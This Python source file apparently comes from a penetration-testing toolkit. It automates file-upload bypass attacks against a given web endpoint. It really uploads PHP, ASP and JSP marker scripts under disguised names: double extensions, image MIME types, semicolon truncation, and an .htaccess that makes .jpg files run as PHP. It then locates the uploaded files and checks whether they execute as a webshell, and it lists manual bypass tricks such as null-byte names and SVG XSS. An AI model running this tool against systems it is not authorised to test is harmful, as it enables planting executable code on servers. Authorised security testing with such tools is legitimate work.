"""文件上传检测工具 — 真正上传 + 验证可访问性"""

import hashlib
import os
import re
from typing import Optional
from urllib.parse import urljoin, urlparse

from ..client import HttpClient
from ..utils import normalize_url


async def bb_file_upload(
    url: str,
    proxy: Optional[str] = None,
    cookie: Optional[str] = None,
    auth_token: Optional[str] = None,
    timeout: int = 15,
) -> str:
    """
    文件上传绕过检测 — 扩展名/MIME/双扩展名/截断/.htaccess/SVG

    改进:
    - 真正尝试上传多种绕过 Payload
    - 自动尝试访问上传路径验证文件是否可访问
    - 检测文件是否被执行（PHP/JSP 代码执行检测）

    Args:
        url: 上传接口 URL
        proxy: 代理地址（可选）
        cookie: Cookie（可选）
        auth_token: Bearer Token（可选）
        timeout: 超时秒数（默认 15）

    Returns:
        文件上传检测结果（含实际上传验证）
    """
    url = normalize_url(url)
    base_domain = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    results = []
    results.append(f"[*] 文件上传检测目标: {url}")
    results.append("")

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)

    # 唯一标记，用于验证上传后文件可访问
    upload_marker = f"xuanmu_{hashlib.md5(os.urandom(8)).hexdigest()[:8]}"
    payload_php = f"<?php echo '{upload_marker}';?>"
    payload_jsp = f'<%= "{upload_marker}" %>'
    payload_asp = f'<%Response.Write("{upload_marker}")%>'

    # 检测标记
    detect_marker = f"<!-- {upload_marker} -->"

    # 1. 获取页面，分析上传表单
    upload_endpoint = url
    upload_field = "file"
    is_multipart = False

    try:
        resp = await client.get(url)
        body = resp.text

        # 查找文件上传表单
        form_m = re.search(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*enctype=["\']multipart/form-data["\'][^>]*>(.*?)</form>',
            body, re.IGNORECASE | re.DOTALL,
        )
        if form_m:
            action = form_m.group(1)
            is_multipart = True
            results.append("[✓] 发现 multipart/form-data 上传表单")
            if action and not action.startswith(("#", "javascript:")):
                upload_endpoint = urljoin(url, action)

        # 查找 file input 字段名
        input_m = re.search(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\']', body, re.IGNORECASE)
        if input_m:
            upload_field = input_m.group(1)

        # 检查是否有文件上传相关的 JS
        if re.search(r'(upload|file|import|attachment)', body, re.IGNORECASE):
            if not is_multipart:
                results.append("[*] 页面含上传关键词，可能是 JS/AJAX 上传")
                results.append("")

        results.append(f"[*] 上传端点: {upload_endpoint}")
        results.append(f"[*] 字段名: {upload_field}")
        results.append("")

        # 预检：没有上传表单/文件输入/关键词时跳过实际上传
        if not is_multipart and not input_m and not re.search(r'(upload|file|import|attachment)', body, re.IGNORECASE):
            results.append("[INFO] 目标未发现文件上传功能，跳过实际上传测试")
            results.append("[*] 如果确认存在上传接口，请直接指定上传端点 URL")
            return "\n".join(results)

    except Exception as e:
        results.append(f"[!] 页面获取失败: {e}")
        results.append("")

    # 2. 真正尝试上传
    results.append("[*] 实际上传测试:")
    results.append("")

    test_cases = [
        # (文件名, 内容, MIME, 测试名称)
        ("test.php", payload_php, "application/x-php", "PHP 直接上传"),
        ("test.php5", payload_php, "text/plain", "PHP5 扩展"),
        ("test.phtml", payload_php, "text/plain", "PHTML 扩展"),
        ("test.jpg", payload_php, "image/jpeg", "图片马 (jpg)"),
        ("test.png", payload_php, "image/png", "图片马 (png)"),
        ("test.jpg.php", payload_php, "image/jpeg", "双扩展名 .jpg.php"),
        ("test.php.jpg", payload_php, "image/jpeg", "双扩展名 .php.jpg"),
        ("test.php;.jpg", payload_php, "image/jpeg", "参数截断 .php;.jpg"),
        ("test.asp", payload_asp, "text/plain", "ASP 上传"),
        ("test.aspx", payload_asp, "text/plain", "ASPX 上传"),
        ("test.jsp", payload_jsp, "text/plain", "JSP 上传"),
        ("test.cer", payload_php, "image/jpeg", "CER 扩展"),
        ("test.asa", payload_php, "image/jpeg", "ASA 扩展"),
        ("test.htaccess", f"AddType application/x-httpd-php .jpg\n", "text/plain", ".htaccess 上传"),
        ("test.shtml", f"<!--#echo var=\"DOCUMENT_ROOT\" -->\n", "text/plain", "SHTML SSI 上传"),
    ]

    uploaded_files = []
    for filename, content, mime, test_name in test_cases:
        try:
            files_data = {upload_field: (filename, content, mime)}
            resp = await client.post(upload_endpoint, files=files_data)
            status = resp.status_code
            resp_body = resp.text[:500]

            if status in (200, 201, 204):
                # 尝试从响应体中提取上传后的路径
                path_patterns = [
                    rf'(https?://[^"\'\s]+{re.escape(filename)})',
                    rf'("/?uploads?/[^"\'\s]*{re.escape(filename)})',
                    rf'("/?files?/[^"\'\s]*{re.escape(filename)})',
                    rf'("/?images?/[^"\'\s]*{re.escape(filename)})',
                    rf'("/?attachments?/[^"\'\s]*{re.escape(filename)})',
                    rf'("/?tmp/[^"\'\s]*{re.escape(filename)})',
                ]
                found_path = None
                for pat in path_patterns:
                    pm = re.search(pat, resp_body)
                    if pm:
                        found_path = pm.group(1).strip('"')
                        break

                if found_path:
                    uploaded_files.append((filename, found_path, test_name))
                    results.append(f"  [{status}] {test_name}: {filename}")
                    results.append(f"    → 提取到路径: {found_path}")
                else:
                    # 尝试常见上传路径
                    for upload_dir in ["/uploads/", "/files/", "/upload/", "/images/", "/attachments/", "/tmp/"]:
                        test_path = urljoin(base_domain, f"{upload_dir}{filename}")
                        try:
                            check_resp = await client.get(test_path, timeout=5)
                            if check_resp.status_code == 200:
                                uploaded_files.append((filename, test_path, test_name))
                                results.append(f"  [{status}] {test_name}: {filename}")
                                results.append(f"    → 文件可访问: {test_path}")
                                break
                        except Exception:
                            continue
                    else:
                        results.append(f"  [{status}] {test_name}: {filename}（未找到文件路径）")
            elif status == 302:
                results.append(f"  [{status}] {test_name}: {filename}（跳转，可能上传成功）")
            else:
                results.append(f"  [{status}] {test_name}: {filename}")
        except Exception as e:
            results.append(f"  [!] {test_name}: 异常 — {str(e)[:60]}")

    # 3. 验证上传的文件是否可执行
    results.append("")
    if uploaded_files:
        results.append(f"[!] 可能上传成功的文件 ({len(uploaded_files)} 个):")
        results.append("")

        for filename, filepath, test_name in uploaded_files:
            results.append(f"  🔗 {filepath}")
            # 尝试访问，检查执行结果
            try:
                exec_resp = await client.get(filepath, timeout=10)
                exec_status = exec_resp.status_code
                if upload_marker in exec_resp.text:
                    results.append(f"    [🔥 代码执行] HTTP {exec_status} — WebShell 可执行！")
                elif exec_status == 200:
                    results.append(f"    [✓ 文件可读] HTTP {exec_status}（内容 {len(exec_resp.text)} bytes）")
                else:
                    results.append(f"    [HTTP {exec_status}]")
            except Exception as e:
                results.append(f"    [访问失败] {str(e)[:60]}")
            results.append("")
    else:
        results.append("[-] 所有上传尝试均未验证成功")

    # 4. 仍然保留参考建议
    results.append("[*] 手动绕过技巧参考:")
    results.append("  1. Content-Type 修改: image/jpeg, text/plain")
    results.append("  2. 双扩展名: shell.php.jpg, shell.jpg.php")
    results.append("  3. 特殊字符: shell.php%00.jpg, shell.php;.jpg")
    results.append("  4. .htaccess 上传: 先传 .htaccess 再传图片马")
    results.append("  5. 大小写绕过: shell.PhP, shell.Asp")
    results.append("  6. SVG XSS: 上传含 JS 的 SVG 文件")
    results.append("  7. 检查上传响应体: 有时会直接返回上传路径")

    return "\n".join(results)
